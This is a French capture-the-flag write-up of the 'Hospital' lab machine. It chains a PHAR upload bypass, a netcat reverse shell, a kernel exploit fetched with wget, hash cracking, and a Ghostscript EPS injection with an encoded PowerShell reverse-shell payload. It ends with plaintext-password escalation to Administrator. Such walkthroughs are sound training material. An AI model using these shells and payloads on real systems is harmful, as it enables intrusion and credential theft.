  # Hospital

	echo "10.10.11.241 hospital.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.241 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.241 -oN nmap.txt
	
Scans classiques.

    PORT     STATE SERVICE           VERSION
    22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
    53/tcp   open  domain?
    88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-24 00:10:48Z)
    135/tcp  open  msrpc             Microsoft Windows RPC
    139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
    389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
    443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ldapssl?
    1801/tcp open  msmq?
    2103/tcp open  msrpc             Microsoft Windows RPC
    2105/tcp open  msrpc             Microsoft Windows RPC
    2107/tcp open  msrpc             Microsoft Windows RPC
    2179/tcp open  vmrdp?
    3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
    3269/tcp open  globalcatLDAPssl?
    3389/tcp open  ms-wbt-server     Microsoft Terminal Services
    5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    6012/tcp open  msrpc             Microsoft Windows RPC
    6404/tcp open  msrpc             Microsoft Windows RPC
    6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
    6407/tcp open  msrpc             Microsoft Windows RPC
    6409/tcp open  msrpc             Microsoft Windows RPC
    6613/tcp open  msrpc             Microsoft Windows RPC
    6621/tcp open  msrpc             Microsoft Windows RPC
    8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
    9389/tcp open  mc-nmf            .NET Message Framing


Côté web, il y a juste une page de login sur le site HTTPS et une page de login sur le site en 8080.

Fuzzing supplémentaire : 

    feroxbuster --silent -u http://hospital.htb:8080
    feroxbuster --silent -u https://hospital.htb:443 -k
    
	ffuf -H "Host: FUZZ.hospital.htb" -u http://hospital.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
    

Quasiment rien sur le site HTTPS à part une indication que ce site utilise RoundCube.

Pas mal de sous-dossiers sur l'autre site, dont un /uploads/ qui me fait directement penser à de l'upload de fichiers arbitraires : 

    http://hospital.htb:8080/ => login.php                                                                              
    http://hospital.htb:8080/images => http://hospital.htb:8080/images/                                                 
    http://hospital.htb:8080/js => http://hospital.htb:8080/js/                                                         
    http://hospital.htb:8080/fonts => http://hospital.htb:8080/fonts/                                                   
    http://hospital.htb:8080/css => http://hospital.htb:8080/css/                                                      
    http://hospital.htb:8080/vendor => http://hospital.htb:8080/vendor/                                                 
    http://hospital.htb:8080/uploads => http://hospital.htb:8080/uploads/                                              
    http://hospital.htb:8080/images/icons => http://hospital.htb:8080/images/icons/                                     
    http://hospital.htb:8080/uploads/l => http://hospital.htb:8080/uploads/l/                                           
    http://hospital.htb:8080/vendor/jquery => http://hospital.htb:8080/vendor/jquery/                                   
    http://hospital.htb:8080/uploads/m => http://hospital.htb:8080/uploads/m/                                          
    http://hospital.htb:8080/uploads/w => http://hospital.htb:8080/uploads/w/                                           
    http://hospital.htb:8080/uploads/u => http://hospital.htb:8080/uploads/u/                                           
    http://hospital.htb:8080/uploads/w/work => http://hospital.htb:8080/uploads/w/work/                                 
    http://hospital.htb:8080/vendor/animate => http://hospital.htb:8080/vendor/animate/ 

Sur http://hospital.htb:8080/index.php après avoir créé un compte comme le permet l'interface, on voit un formulaire d'upload. Impossible d'envoyer du PHP mais le format PHAR passe. 

Voir https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology pour la liste des formats à tester.

En allant sur http://hospital.htb:8080/uploads/shell.phar on a bien notre shell en tant que "www-data". Pas de flag utilisateur et on est sur du Linux alors que la machine est décrite comme une Windows, il y a sûrement un genre de pivoting à faire.

Fiabilisation du shell et recherche : 

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.15 9999 >/tmp/f
    python3 -c "import pty ; pty.spawn('/bin/bash');"
    cd /tmp
    wget http://10.10.16.15/linpeas.sh
    chmod +x ./linpeas.sh
    ./linpeas.sh

On trouve un mot de passe pour la base de données : 

> define('DB_PASSWORD', 'my$qls3rv1c3!');
> define('DB_USERNAME', 'root');

    mysql -u'root' -p 


La base de données contient juste les utilisateurs enregistrés depuis le portail web, rien d'intéressant.


LinPEAS trouve aussi un CVE : 
https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c

    wget http://10.10.16.15/CVE-2021_3493.c
    gcc CVE-2021_3493.c -o exploit
    ./exploit
    whoami
    
On est maintenant root sur ce Linux, qui semble être un container. Dans **/etc/shadow** on trouve un hash pour un utilisateur nommé "drwilliams" : 
> drwilliams:\$6\$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y

En cassant ce hash avec John on obtient le mot de passe.

Impossible de se connecter directement au DC même si les credentials fonctionnent, mais ils fonctionnent également pour le portail web.

En se connectant sur le portail web, on voit un mail parlant de GhostScript et de fichiers à envoyer au format EPS.

Un CVE récent existe justement pour ce cas de figure : 
https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection


    git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection 
    
    cd CVE-2023-36664-Ghostscript-command-injection 
    
    PAYLOAD="powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
    
    python3 CVE_2023_36664_exploit.py --inject --payload $PAYLOAD --filename shell.eps
    
    
En répondant au mail avec notre shell EPS en pièce-jointe, on reçoit bien une connexion. 
    
    type C:\Users\drbrown.HOSPITAL\Desktop\user.txt
     

## Élévation de privilèges


On trouve un mot de passe en clair directement dans un script du dossier courant : 

    type C:\Users\drbrown.HOSPITAL\Documents\ghostscript.bat
    evil-winrm -u drbrown -p 'MDP' -i 10.10.11.241 
    
Énumération : 

    upload winpeas.exe
    upload PrivEscCheck.ps1
    
    .\winpeas.exe
    Import-Module .\PrivEscCheck.ps1
    Invoke-PrivEscCheck -Extended
    
On trouve également un mot de passe administrateur dans un script VBS : 

    type C:\Windows\System32\SyncAppvPublicationServer.vbs

Il fonctionne : 

    evil-winrm -u Administrator -p 'MDP' -i 10.10.11.241
    type C:\Users\Administrator\Desktop\root.txt

    
    
